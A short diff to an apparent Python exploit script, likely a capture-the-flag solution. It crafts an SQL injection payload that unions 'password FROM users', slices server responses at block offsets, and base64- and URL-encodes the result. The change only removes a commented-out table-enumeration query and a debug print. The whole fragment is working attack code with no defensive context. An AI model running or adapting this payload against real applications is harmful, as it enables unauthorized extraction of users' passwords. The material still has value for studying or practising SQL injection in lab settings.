@@ -31,7 +31,6 @@ if __name__ == '__main__':
     inner_block_query = "          "
     res_inner_block = send_request(session, inner_block_query)
     inner_block = res_inner_block[len(prefix):len(res_inner_block) - len(suffix)]
-    #query = "AAAAAAAAA' UNION SELECT table_name FROM information_schema.tables; -- " # The final space is necessary!
     query = "AAAAAAAAA' UNION SELECT ALL password FROM users; -- " # The final space is necessary!
     res = send_request(session, query)
     my_part = res[len(prefix) + len(inner_block):]
@@ -39,5 +38,4 @@ if __name__ == '__main__':
     decoded = base64.b64decode(query)
     re_encoded = base64.b64encode(decoded)
     url_encoded = urllib.parse.quote_plus(re_encoded)
-    #print(query)
     print(url_encoded)
